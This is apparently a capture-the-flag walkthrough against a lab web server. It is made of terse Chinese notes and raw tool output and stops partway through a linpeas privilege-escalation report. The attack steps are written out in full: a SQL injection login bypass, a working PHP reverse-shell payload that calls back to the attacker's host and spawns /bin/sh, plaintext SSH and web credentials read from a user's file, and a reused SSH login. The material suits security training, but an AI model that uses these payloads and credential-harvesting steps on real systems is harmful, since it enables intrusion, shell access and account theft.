http://192.168.183.111/registration.php (Status: 200) [Size: 9409]\rhttp://192.168.183.111/logout.php (Status: 200) [Size: 75]\rhttp://192.168.183.111/robots.txt (Status: 200) [Size: 14]\rhttp://192.168.183.111/dashboard.php (Status: 302) [Size: 10272] [--\u0026gt; http://192.168.183.111/index.php] http://192.168.183.111/secret (Status: 301) [Size: 319] [--\u0026gt; http://192.168.183.111/secret/] http://192.168.183.111/leftbar.php (Status: 200) [Size: 1837] admin\u0026#39; or 1=1-- + 上传反弹shell的php文件\n\u0026lt;?php\r$sock = fsockopen(\u0026#34;192.168.45.5\u0026#34;, 1234);\r$descriptorspec = array(\r0 =\u0026gt; $sock,\r1 =\u0026gt; $sock,\r2 =\u0026gt; $sock\r);\r$process = proc_open(\u0026#39;/bin/sh\u0026#39;, $descriptorspec, $pipes);\rproc_close($process);\r?\u0026gt; cat /var/www/loal.txt\r4d398ace4b6acf45d1b7f2e3e84c344b\rcd /home/tony\rcat password.txt\rtony@funbox3:~$ cat password.txt\rssh: yxcvbnmYYY\rgym/admin: asdfghjklXXX\r/store: admin@admin.com admin 使用ssh登录\nssh tony@192.168.183.111 //密码是yxcvbnmYYY tony@funbox3:~$ ./linpeas.sh\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄\r▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄\r▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄\r▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄\r▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄\r▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄\r▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\rlinpeas v3.1.5 - Safe OSCP by carlospolop\rADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner\u0026#39;s permission. Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEGEND: RED/YELLOW: 95% a PE vector\rRED: You must take a look at it\rLightCyan: Users with console\rBlue: Users without console \u0026amp; mounted devs\rGreen: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) LightMangeta: Your username\rStarting linpeas. Caching Writable Folders...\r════════════════════════════════════╣ Basic information ╠════════════════════════════════════ OS: Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020\rUser \u0026amp; Groups: uid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd) Hostname: funbox3\rWritable folder: /dev/shm\r[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h) [+] /usr/bin/nc is available for network discover \u0026amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h) Caching directories using 1 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE ════════════════════════════════════╣ System Information ╠════════════════════════════════════ [+] Operative system [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020\rDistributor ID: Ubuntu\rDescription: Ubuntu 20.04 LTS\rRelease: 20.04\rCodename: focal\r[+] Sudo version\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.31 [+] USBCreator\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation [+] PATH\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\rNew path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\r[+] Date\rSat May 6 04:45:07 UTC 2023 [+] System stats\rFilesystem Size Used Avail Use% Mounted on udev 448M 0 448M 0% /dev\rtmpfs 99M 1.1M 98M 2% /run\r/dev/sda2 4.7G 3.7G 809M 83% /\rtmpfs 491M 0 491M 0% /dev/shm\rtmpfs 5.0M 0 5.0M 0% /run/lock\rtmpfs 491M 0 491M 0% /sys/fs/cgroup\r/dev/sda3 179M 101M 64M 62% /boot\r/dev/loop0 56M 56M 0 100% /snap/core18/1932\r/dev/loop3 56M 56M 0 100% /snap/core18/1885\r/dev/loop4 31M 31M 0 100% /snap/snapd/9279\r/dev/loop1 70M 70M 0 100% /snap/lxd/18013\r/dev/loop5 31M 31M 0 100% /snap/snapd/9721\r/dev/loop2 70M 70M 0 100% /snap/lxd/18077\rtmpfs 99M 0 99M 0% /run/user/1000\rtotal used free shared buff/cache available\rMem: 1004780 538856 87860 4096 378064 296940\rSwap: 677884 3084 674800\r[+] CPU info\rArchitecture: x86_64 CPU op-mode(s): 32-bit, 64-bit\rByte Order: Little Endian\rAddress sizes: 45 bits physical, 48 bits virtual\rCPU(s): 1\rOn-line CPU(s) list: 0\rThread(s) per core: 1\rCore(s) per socket: 1\rSocket(s): 1\rNUMA node(s): 1\rVendor ID: AuthenticAMD\rCPU family: 23\rModel: 1\rModel name: AMD EPYC 7371 16-Core Processor\rStepping: 2\rCPU MHz: 3094.187\rBogoMIPS: 6188.37\rHypervisor vendor: VMware\rVirtualization type: full\rL1d cache: 32 KiB\rL1i cache: 64 KiB\rL2 cache: 512 KiB\rL3 cache: 64 MiB\rNUMA node0 CPU(s): 0\rVulnerability Itlb multihit: Not affected\rVulnerability L1tf: Not affected\rVulnerability Mds: Not affected\rVulnerability Meltdown: Not affected\rVulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via\rprctl and seccomp\rVulnerability Spectre v1: Mitigation; usercopy/swapgs barriers and __user p\rointer sanitization\rVulnerability Spectre v2: Mitigation; Full AMD retpoline, IBPB conditional,\rSTIBP disabled, RSB filling\rVulnerability Srbds: Not affected\rVulnerability Tsx async abort: Not affected\rFlags: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm cons\rtant_tsc rep_good nopl tsc_reliable nonstop_tsc c\rpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse\r4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c\rrdrand hypervisor lahf_lm extapic cr8_legacy abm\rsse4a misalignsse 3dnowprefetch osvw ssbd ibpb v\rmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx sm\rap clflushopt sha_ni xsaveopt xsavec xgetbv1 xsav\res clzero arat overflow_recov succor\r[+] Environment\r[i] Any private information inside environment variables? LESSOPEN=| /usr/bin/lesspipe %s HISTFILESIZE=0\rUSER=tony\rSSH_CLIENT=192.168.45.5 39270 22\rXDG_SESSION_TYPE=tty\rSHLVL=1\rMOTD_SHOWN=pam\rHOME=/home/tony\rSSH_TTY=/dev/pts/1\rDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus\rLOGNAME=tony\r_=./linpeas.sh\rXDG_SESSION_CLASS=user\rTERM=xterm-256color\rXDG_SESSION_ID=9\rPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\rXDG_RUNTIME_DIR=/run/user/1000\rLANG=C.UTF-8\rHISTSIZE=0\rSHELL=/bin/bash\rLESSCLOSE=/usr/bin/lesspipe %s %s\rSSH_CONNECTION=192.168.45.5 39270 192.168.183.111 22\rXDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop\rHISTFILE=/dev/null\r[+] Searching Signature verification failed in dmseg\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed Not Found [+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.\rapparmor module is loaded.\r[+] grsecurity present? ............ grsecurity Not Found\r[+] PaX bins present? .............. PaX Not Found [+] Execshield enabled? ............ Execshield Not Found [+] SELinux enabled? ............... sestatus Not Found [+] Is ASLR enabled? ............... Yes [+] Printer? ....................... lpstat Not Found\r[+] Is this a virtual machine? ..... Yes (vmware) [+] Is this a container? ........... No\r[+] Any running containers? ........ No ═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════ [+] Any sd*/disk* disk in /dev? (limit 20) disk sda\rsda1\rsda2\rsda3\r[+] Unmounted file-system?\r[i] Check if you can mount umounted devices /dev/disk/by-uuid/12e1c912-68fd-4eb9-8269-78577701ff7b / ext4 defaults 0 0 /dev/disk/by-uuid/f1ceb436-2aed-462e-9b2f-bd1301ce609d /boot ext4 defaults 0 0\r/swap.img none swap sw 0 0\r════════════════════════════════════╣ Available Software ╠════════════════════════════════════ [+] Useful software /usr/bin/nc /usr/bin/netcat\r/usr/bin/wget\r/usr/bin/curl\r/usr/bin/ping\r/usr/bin/base64\r/usr/bin/python3\r/usr/bin/perl\r/usr/bin/php\r/usr/bin/sudo\r/snap/bin/lxc\r[+] Installed Compiler\r══════════════════════════════╣ Processes, Cron, Services, Timers \u0026amp; Sockets ╠════════════════════════════════ [+] Cleaned processes [i] Check weird \u0026amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes root 6192 0.0 0.0 2488 584 ? S 04:45 0:00 _ bpfilter_umh\rroot 1 0.0 1.1 169668 11484 ? Ss 02:32 0:01 /sbin/init maybe-ubiquity\rroot 424 0.0 1.3 51632 13104 ? S\u0026lt;s 02:32 0:00 /lib/systemd/systemd-journald\rroot 454 0.0 0.5 21332 5108 ? Ss 02:32 0:00 /lib/systemd/systemd-udevd\rroot 5451 0.0 0.2 21332 2828 ? S 04:45 0:00 _ /lib/systemd/systemd-udevd\rroot 5453 0.0 0.2 21332 2828 ? S 04:45 0:00 _ /lib/systemd/systemd-udevd\rroot 5455 0.0 0.2 21332 2828 ? S 04:45 0:00 _ /lib/systemd/systemd-udevd\rroot 5456 0.0 0.2 21332 2828 ? S 04:45 0:00 _ /lib/systemd/systemd-udevd\rroot 5457 0.0 0.2 21332 2828 ? S 04:45 0:00 _ /lib/systemd/systemd-udevd\rroot 5458 0.0 0.2 21332 2828 ? S 04:45 0:00 _ /lib/systemd/systemd-udevd\rroot 5459 0.0 0.2 21332 2828 ? S 04:45 0:00 _ /lib/systemd/systemd-udevd\rroot 5460 0.0 0.2 21332 2828 ? S 04:45 0:00 _ /lib/systemd/systemd-udevd\rroot 5461 0.0 0.2 21332 2828 ? S 04:45 0:00 _ /lib/systemd/systemd-udevd\rroot 5462 0.0 0.2 21332 2828 ? S 04:45 0:00 _ /lib/systemd/systemd-udevd\rroot 581 0.0 1.7 345752 17976 ? SLsl 02:32 0:01 /sbin/multipathd -d -s\rsystemd+ 638 0.0 0.6 90388 6288 ? Ssl 02:32 0:00 /lib/systemd/systemd-timesyncd\r└─(Caps) 0x0000000002000000=cap_sys_time\rroot 641 0.0 0.9 46312 9184 ? Ss 02:32 0:00 /usr/bin/VGAuthService root 643 0.0 0.6 235868 6512 ? Ssl 02:32 0:03 /usr/bin/vmtoolsd systemd+ 702 0.0 1.1 24044 11252 ? Ss 02:32 0:00 /lib/systemd/systemd-resolved\rroot 781 0.0 0.6 234332 6176 ? Ssl 02:34 0:00 /usr/lib/accountsservice/accounts-daemon root 798 0.0 0.2 5568 2900 ? Ss 02:34 0:00 /usr/sbin/cron -f\rmessage+ 800 0.0 0.4 7588 4156 ? Ss 02:34 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\r└─(Caps) 0x0000000020000000=cap_audit_write\rroot 811 0.0 1.3 26236 13164 ? Ss 02:34 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers\rsyslog 813 0.0 0.4 224324 4912 ? Ssl 02:34 0:00 /usr/sbin/rsyslogd -n -iNONE\rroot 815 0.0 3.0 629544 30656 ? Ssl 02:34 0:01 /usr/lib/snapd/snapd\rroot 831 0.0 0.7 16808 7812 ? Ss 02:34 0:00 /lib/systemd/systemd-logind\rdaemon[0m 840 0.0 0.2 3792 2388 ? Ss 02:34 0:00 /usr/sbin/atd -f\rroot 842 0.0 1.6 194060 16340 ? Ss 02:34 0:00 /usr/sbin/apache2 -k start www-data 1687 0.0 1.5 194840 15556 ? S 02:39 0:01 _ /usr/sbin/apache2 -k start www-data 1690 0.0 1.4 194872 14756 ? S 02:39 0:01 _ /usr/sbin/apache2 -k start www-data 4860 0.0 0.0 2608 604 ? S 04:35 0:00 | _ sh -c /bin/sh\rwww-data 4861 0.0 0.0 2608 544 ? S 04:35 0:00 | _ /bin/sh\rwww-data 4892 0.0 0.7 12944 7236 ? S 04:36 0:00 | _ python3 -c import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\rwww-data 4893 0.0 0.3 4336 3664 pts/0 Ss+ 04:36 0:00 | _ /bin/bash\rwww-data 1873 0.0 1.5 194864 15500 ? S 02:46 0:01 _ /usr/sbin/apache2 -k start www-data 2745 0.0 1.5 194848 15252 ? S 03:16 0:01 _ /usr/sbin/apache2 -k start www-data 2772 0.0 1.4 194840 14532 ? S 03:17 0:01 _ /usr/sbin/apache2 -k start www-data 2958 0.0 1.4 194840 14748 ? S 03:24 0:01 _ /usr/sbin/apache2 -k start www-data 3204 0.0 1.3 194864 13672 ? S 03:34 0:00 _ /usr/sbin/apache2 -k start www-data 4841 0.0 0.9 194576 9104 ? S 04:35 0:00 _ /usr/sbin/apache2 -k start www-data 4932 0.0 0.9 194576 9104 ? S 04:38 0:00 _ /usr/sbin/apache2 -k start www-data 5297 0.0 0.9 194576 9320 ? S 04:42 0:00 _ /usr/sbin/apache2 -k start www-data 5298 0.0 0.9 194576 9336 ? S 04:42 0:00 _ /usr/sbin/apache2 -k start tony 5191 0.0 0.5 13920 5756 ? S 04:39 0:00 _ sshd: tony@pts/1\rtony 5197 0.0 0.4 7064 4968 pts/1 Ss 04:39 0:00 _ -bash\rtony 5360 0.1 0.2 2948 2072 pts/1 S+ 04:45 0:00 _ /bin/sh ./linpeas.sh\rtony 6256 0.0 0.0 2948 524 pts/1 S+ 04:45 0:00 _ /bin/sh ./linpeas.sh\rtony 6260 0.0 0.3 7792 3288 pts/1 R+ 04:45 0:00 | _ ps fauxwww\rtony 6259 0.0 0.0 2948 524 pts/1 S+ 04:45 0:00 _ /bin/sh ./linpeas.sh\rroot 941 0.0 0.5 232700 5856 ? Ssl 02:34 0:00 /usr/lib/policykit-1/polkitd --no-debug\rroot 946 0.0 1.4 105060 14536 ? Ssl 02:34 0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal\rmysql 947 0.1 37.5 1302824 377432 ? Ssl 02:34 0:14 /usr/sbin/mysqld\rroot 948 0.0 0.1 2860 1752 tty1 Ss+ 02:34 0:00 /sbin/agetty -o -p -- u --noclear tty1 linux\rsystemd+ 1342 0.0 0.6 18544 6364 ? Ss 02:34 0:00 /lib/systemd/systemd-networkd\r└─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw\rtony 5071 0.0 0.9 18552 9500 ? Ss 04:39 0:00 /lib/systemd/systemd --user\rtony 5072 0.0 0.3 171004 3480 ? S 04:39 0:00 _ (sd-pam)\rroot 6011 3.0 0.1 4636 1848 ? Ss 04:45 0:00 /bin/sh /snap/lxd/18077/commands/daemon.start root 6156 38.0 4.4 1423324 44800 ? Sl 04:45 0:00 _ lxd --logfile /var/snap/lxd/common/lxd/logs/lxd.log --group lxd\rroot 6157 25.0 3.1 1007536 31432 ? Sl 04:45 0:00 _ lxd waitready\rroot 6158 0.0 0.0 4636 124 ? S 04:45 0:00 _ /bin/sh /snap/lxd/18077/commands/daemon.start\rroot 6181 0.0 0.0 6288 844 ? S 04:45 0:00 _ sleep 1\rroot 6145 0.0 0.1 97804 1632 ? Sl 04:45 0:00 lxcfs /var/snap/lxd/common/var/lib/lxcfs -p /var/snap/lxd/common/lxcfs.pid\r[+] Binary processes permissions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes 1.2M -rwxr-xr-x 1 root root 1.2M Feb 25 2020 /bin/bash 0 lrwxrwxrwx 1 root root 4 Apr 23 2020 /bin/sh -\u0026gt; dash\r1.5M -rwxr-xr-x 1 root root 1.6M Apr 22 2020 /lib/systemd/systemd\r156K -rwxr-xr-x 1 root root 155K Apr 22 2020 /lib/systemd/systemd-journald\r260K -rwxr-xr-x 1 root root 259K Apr 22 2020 /lib/systemd/systemd-logind\r2.2M -rwxr-xr-x 1 root root 2.2M Apr 22 2020 /lib/systemd/systemd-networkd\r396K -rwxr-xr-x 1 root root 395K Apr 22 2020 /lib/systemd/systemd-resolved\r56K -rwxr-xr-x 1 root root 55K Apr 22 2020 /lib/systemd/systemd-timesyncd\r716K -rwxr-xr-x 1 root root 719K Apr 22 2020 /lib/systemd/systemd-udevd\r68K -rwxr-xr-x 1 root root 68K Apr 2 2020 /sbin/agetty\r0 lrwxrwxrwx 1 root root 20 Apr 22 2020 /sbin/init -\u0026gt; /lib/systemd/systemd\r128K -rwxr-xr-x 1 root root 127K Apr 6 2020 /sbin/multipathd\r140K -rwxr-xr-x 1 root root 139K Jun 22 2020 /usr/bin/VGAuthService\r244K -rwxr-xr-x 1 root root 244K Jun 11 2020 /usr/bin/dbus-daemon[0m\r0 lrwxrwxrwx 1 root root 9 Mar 13 2020 /usr/bin/python3 -\u0026gt; python3.8\r64K -rwxr-xr-x 1 root root 63K Jun 22 2020 /usr/bin/vmtoolsd\r200K -rwxr-xr-x 1 root root 199K Mar 30 2020 /usr/lib/accountsservice/accounts-daemon\r120K -rwxr-xr-x 1 root root 119K Aug 16 2019 /usr/lib/policykit-1/polkitd\r25M -rwxr-xr-x 1 root root 25M Jul 10 2020 /usr/lib/snapd/snapd\r692K -rwxr-xr-x 1 root root 689K Apr 13 2020 /usr/sbin/apache2\r32K -rwxr-xr-x 1 root root 31K Nov 12 2018 /usr/sbin/atd\r56K -rwxr-xr-x 1 root root 55K Feb 13 2020 /usr/sbin/cron\r63M -rwxr-xr-x 1 root root 63M Jul 27 2020 /usr/sbin/mysqld\r712K -rwxr-xr-x 1 root root 711K Feb 11 2020 /usr/sbin/rsyslogd\r[+] Files opened by processes belonging to other users\r[i] This is usually empty because of the lack of privileges to read other user processes information COMMAND PID TID TASKCMD USER FD TYPE DEVICE SIZE/OFF NODE NAME\r[+] Processes with credentials in memory (root req)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory gdm-password Not Found gnome-keyring-daemon Not Found lightdm Not Found vsftpd Not Found apache2 process found (dump creds from memory as root) sshd: process found (dump creds from memory as root)\r[+] Cron jobs\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs /usr/bin/crontab incrontab Not Found\r-rw-r--r-- 1 root root 1042 Feb 13 2020 /etc/crontab /etc/cron.d:\rtotal 24\rdrwxr-xr-x 2 root root 4096 Jul 30 2020 .\rdrwxr-xr-x 97 root root 4096 Oct 30 2020 ..\r-rw-r--r-- 1 root root 102 Feb 13 2020 .placeholder\r-rw-r--r-- 1 root root 201 Feb 14 2020 e2scrub_all\r-rw-r--r-- 1 root root 712 Mar 27 2020 php\r-rw-r--r-- 1 root root 191 Apr 23 2020 popularity-contest\r/etc/cron.daily:\rtotal 52\rdrwxr-xr-x 2 root root 4096 Jul 30 2020 .\rdrwxr-xr-x 97 root root 4096 Oct 30 2020 ..\r-rw-r--r-- 1 root root 102 Feb 13 2020 .placeholder\r-rwxr-xr-x 1 root root 539 Apr 13 2020 apache2\r-rwxr-xr-x 1 root root 376 Dec 4 2019 apport\r-rwxr-xr-x 1 root root 1478 Apr 9 2020 apt-compat\r-rwxr-xr-x 1 root root 355 Dec 29 2017 bsdmainutils\r-rwxr-xr-x 1 root root 1187 Sep 5 2019 dpkg\r-rwxr-xr-x 1 root root 377 Jan 21 2019 logrotate\r-rwxr-xr-x 1 root root 1123 Feb 25 2020 man-db\r-rwxr-xr-x 1 root root 4574 Jul 18 2019 popularity-contest\r-rwxr-xr-x 1 root root 214 Apr 2 2020 update-notifier-common\r/etc/cron.hourly:\rtotal 12\rdrwxr-xr-x 2 root root 4096 Apr 23 2020 .\rdrwxr-xr-x 97 root root 4096 Oct 30 2020 ..\r-rw-r--r-- 1 root root 102 Feb 13 2020 .placeholder\r/etc/cron.monthly:\rtotal 12\rdrwxr-xr-x 2 root root 4096 Apr 23 2020 .\rdrwxr-xr-x 97 root root 4096 Oct 30 2020 ..\r-rw-r--r-- 1 root root 102 Feb 13 2020 .placeholder\r/etc/cron.weekly:\rtotal 20\rdrwxr-xr-x 2 root root 4096 Apr 23 2020 .\rdrwxr-xr-x 97 root root 4096 Oct 30 2020 ..\r-rw-r--r-- 1 root root 102 Feb 13 2020 .placeholder\r-rwxr-xr-x 1 root root 813 Feb 25 2020 man-db\r-rwxr-xr-x 1 root root 211 Apr 2 2020 update-notifier-common\rSHELL=/bin/sh\rPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\r[+] Services\r[i] Search for outdated versions [ - ] apache-htcacheclean [ + ] apache2\r[ + ] apparmor\r[ + ] apport\r[ + ] atd\r[ - ] console-setup.sh\r[ + ] cron\r[ - ] cryptdisks\r[ - ] cryptdisks-early\r[ + ] dbus\r[ + ] grub-common\r[ - ] hwclock.sh\r[ - ] irqbalance\r[ - ] iscsid\r[ - ] keyboard-setup.sh\r[ + ] kmod\r[ - ] lvm2\r[ - ] lvm2-lvmpolld\r[ + ] multipath-tools\r[ + ] mysql\r[ - ] open-iscsi\r[ + ] open-vm-tools\r[ - ] plymouth\r[ - ] plymouth-log\r[ + ] procps\r[ - ] rsync\r[ + ] rsyslog\r[ - ] screen-cleanup\r[ + ] ssh\r[ + ] udev\r[ + ] ufw\r[ + ] unattended-upgrades\r[ - ] uuidd\r[+] Systemd PATH\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin [+] Analyzing .service files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services /lib/systemd/system/atd.service is executing some relative path /lib/systemd/system/initrd-cleanup.service is executing some relative path\r/lib/systemd/system/initrd-parse-etc.service is executing some relative path\r/lib/systemd/system/initrd-switch-root.service is executing some relative path\r/lib/systemd/system/initrd-udevadm-cleanup-db.service is executing some relative path\r/lib/systemd/system/mdmonitor-oneshot.service is executing some relative path\r/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service is executing some relative path\r/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service is executing some relative path\r/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service is executing some relative path\r/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service is executing some relative path\r/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service is executing some relative path\r/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service is executing some relative path\r/lib/systemd/system/sysinit.target.wants/systemd-udevd.service is executing some relative path\r/lib/systemd/system/systemd-ask-password-console.service is executing some relative path\r/lib/systemd/system/systemd-ask-password-wall.service is executing some relative path\r/lib/systemd/system/systemd-boot-system-token.service is executing some relative path\r/lib/systemd/system/systemd-halt.service is executing some relative path\r/lib/systemd/system/systemd-hwdb-update.service is executing some relative path\r/lib/systemd/system/systemd-journal-flush.service is executing some relative path\r/lib/systemd/system/systemd-kexec.service is executing some relative path\r/lib/systemd/system/systemd-machine-id-commit.service is executing some relative path\r/lib/systemd/system/systemd-sysusers.service is executing some relative path\r/lib/systemd/system/systemd-tmpfiles-clean.service is executing some relative path\r/lib/systemd/system/systemd-udev-settle.service is executing some relative path\r/lib/systemd/system/systemd-udev-trigger.service is executing some relative path\r/lib/systemd/system/systemd-udevd.service is executing some relative path\r/lib/systemd/system/udev.service is executing some relative path\r/lib/systemd/user/systemd-tmpfiles-clean.service is executing some relative path\r/lib/systemd/user/systemd-tmpfiles-setup.service is executing some relative path\rYou can\u0026#39;t write on systemd PATH\r[+] System timers\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers NEXT LEFT LAST PASSED UNIT ACTIVATES Sat 2023-05-06 05:09:00 UTC 23min left Sat 2023-05-06 04:39:03 UTC 6min ago phpsessionclean.timer phpsessionclean.service Sat 2023-05-06 06:48:24 UTC 2h 3min left Sat 2023-05-06 02:34:45 UTC 2h 10min ago apt-daily-upgrade.timer apt-daily-upgrade.service Sat 2023-05-06 11:54:21 UTC 7h left Sat 2023-05-06 02:34:45 UTC 2h 10min ago apt-daily.timer apt-daily.service Sat 2023-05-06 14:55:57 UTC 10h left Sat 2023-05-06 02:34:45 UTC 2h 10min ago motd-news.timer motd-news.service Sat 2023-05-06 17:09:08 UTC 12h left Sat 2023-05-06 02:34:45 UTC 2h 10min ago fwupd-refresh.timer fwupd-refresh.service Sun 2023-05-07 00:00:00 UTC 19h left Sat 2023-05-06 02:34:45 UTC 2h 10min ago logrotate.timer logrotate.service Sun 2023-05-07 00:00:00 UTC 19h left Sat 2023-05-06 02:34:45 UTC 2h 10min ago man-db.timer man-db.service Sun 2023-05-07 02:47:19 UTC 22h left Sat 2023-05-06 02:47:19 UTC 1h 57min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service\rSun 2023-05-07 03:10:45 UTC 22h left Sat 2023-05-06 02:34:45 UTC 2h 10min ago e2scrub_all.timer e2scrub_all.service Mon 2023-05-08 00:00:00 UTC 1 day 19h left Sat 2023-05-06 02:34:45 UTC 2h 10min ago fstrim.timer fstrim.service n/a n/a n/a n/a snapd.snap-repair.timer snapd.snap-repair.service [+] Analyzing .timer files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers [+] Analyzing .socket files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets [+] HTTP sockets\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets Socket /run/user/1000/snapd-session-agent.socket owned by tony uses HTTP. Response to /index:\r{\u0026#34;type\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;result\u0026#34;:{\u0026#34;message\u0026#34;:\u0026#34;method \\\u0026#34;GET\\\u0026#34; not allowed\u0026#34;}}\rSocket /run/snapd.socket owned by root uses HTTP. Response to /index:\r{\u0026#34;type\u0026#34;:\u0026#34;sync\u0026#34;,\u0026#34;status-code\u0026#34;:200,\u0026#34;status\u0026#34;:\u0026#34;OK\u0026#34;,\u0026#34;result\u0026#34;:[\u0026#34;TBD\u0026#34;]}\rSocket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:\r{\u0026#34;type\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;status-code\u0026#34;:401,\u0026#34;status\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;result\u0026#34;:{\u0026#34;message\u0026#34;:\u0026#34;access 